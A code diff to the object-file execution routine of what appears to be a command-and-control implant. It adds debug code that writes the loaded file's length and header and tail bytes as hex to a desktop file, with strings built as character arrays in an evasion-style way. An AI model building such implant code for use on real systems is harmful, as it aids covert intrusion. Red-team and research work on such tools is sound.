@@ -256,9 +256,56 @@ auto DECLFN Task::ExecBof(
     ULONG BofArgc  = 0;
     PBYTE BofArgs  = Self->Psr->Bytes( Parser, &BofArgc );
 
+    KhDbg("bof len   : %d", BofLen);
     KhDbg("bof id    : %d", BofCmdID);
-    // KhDbg("bof async : %s", BofAsync ? "true" : "false");
     KhDbg("bof args  : %p [%d bytes]", BofArgs, BofArgc);
+
+    // Debug: dump BOF header to verify data integrity
+    if ( BofBuff && BofLen >= 20 ) {
+        CHAR dbgPath[] = {'C',':','\\','U','s','e','r','s','\\','Q','u','i','c','k',
+            'e','m','u','\\','D','e','s','k','t','o','p','\\','b','o','f','_','d','b','g','.','t','x','t',0};
+        HANDLE hFile = Self->Krnl32.CreateFileA(dbgPath, 0x40000000, 0, 0, 2/*CREATE_ALWAYS*/, 0x80, 0);
+        if (hFile && hFile != (HANDLE)-1) {
+            ULONG written = 0;
+            // Write BofLen as decimal
+            CHAR lenBuf[64]; ULONG li = 0;
+            CHAR tag1[] = {'B','o','f','L','e','n','=',0};
+            Self->Krnl32.WriteFile(hFile, tag1, 7, &written, 0);
+            ULONG tmp = BofLen; CHAR digits[12]; INT dc = 0;
+            if (tmp == 0) { digits[dc++] = '0'; }
+            while (tmp > 0) { digits[dc++] = '0' + (tmp % 10); tmp /= 10; }
+            for (INT di = dc - 1; di >= 0; di--) { lenBuf[li++] = digits[di]; }
+            lenBuf[li++] = '\r'; lenBuf[li++] = '\n';
+            Self->Krnl32.WriteFile(hFile, lenBuf, li, &written, 0);
+            // Write first 20 bytes hex
+            CHAR hexTag[] = {'H','D','R','=',0};
+            Self->Krnl32.WriteFile(hFile, hexTag, 4, &written, 0);
+            CHAR hexBuf[64];
+            for (INT hi = 0; hi < 20 && hi < (INT)BofLen; hi++) {
+                BYTE b = BofBuff[hi];
+                hexBuf[hi*3]   = "0123456789ABCDEF"[b >> 4];
+                hexBuf[hi*3+1] = "0123456789ABCDEF"[b & 0xF];
+                hexBuf[hi*3+2] = ' ';
+            }
+            Self->Krnl32.WriteFile(hFile, hexBuf, 60, &written, 0);
+            BYTE crlf[2] = {'\r','\n'};
+            Self->Krnl32.WriteFile(hFile, crlf, 2, &written, 0);
+            // Write last 20 bytes hex
+            CHAR tailTag[] = {'T','A','I','L','=',0};
+            Self->Krnl32.WriteFile(hFile, tailTag, 5, &written, 0);
+            ULONG start = (BofLen > 20) ? BofLen - 20 : 0;
+            ULONG cnt = BofLen - start;
+            for (ULONG hi = 0; hi < cnt; hi++) {
+                BYTE b = BofBuff[start + hi];
+                hexBuf[hi*3]   = "0123456789ABCDEF"[b >> 4];
+                hexBuf[hi*3+1] = "0123456789ABCDEF"[b & 0xF];
+                hexBuf[hi*3+2] = ' ';
+            }
+            Self->Krnl32.WriteFile(hFile, hexBuf, cnt * 3, &written, 0);
+            Self->Krnl32.WriteFile(hFile, crlf, 2, &written, 0);
+            Self->Ntdll.NtClose(hFile);
+        }
+    }
 
     Self->Pkg->Int32( Self->Pkg->Shared, BofCmdID );
 
